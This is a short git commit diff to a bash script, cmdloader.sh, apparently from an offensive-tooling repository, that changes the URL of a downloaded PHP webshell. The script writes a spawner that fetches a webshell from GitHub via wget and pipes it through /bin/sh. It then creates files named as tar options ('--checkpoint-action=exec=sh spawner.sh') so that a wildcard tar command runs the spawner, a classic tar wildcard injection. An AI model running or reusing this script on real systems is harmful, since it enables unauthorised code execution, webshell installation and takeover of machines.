0ff9cb81f24deb99c17269010155fc1e0c9a47b1
mimikatz.ps1 <131539265+ortod0x@users.noreply.github.com>
2025-04-08 00:32:19 +0700

    Update cmdloader.sh

--- additional/cmdloader.sh
+++ additional/cmdloader.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 mkdir object_files
 cd object_files
-echo "mkfifo x.php; wget https://rawcdn.githack.com/ortod0x/rootkitninja_webshell/7f5ee310ae7f45318701941610a4939d794a2c5c/cmd.php 0<x.php | /bin/sh >x.php 2>&1; rm x.php" > spawner.sh
+echo "mkfifo x.php; wget https://github.com/Rootkit-Ninja/webshell/raw/main/php/cmd.php 0<x.php | /bin/sh >x.php 2>&1; rm x.php" > spawner.sh
 echo "" > "--checkpoint-action=exec=sh spawner.sh"
 echo "" > --checkpoint=1
 tar cf spawn.tar *
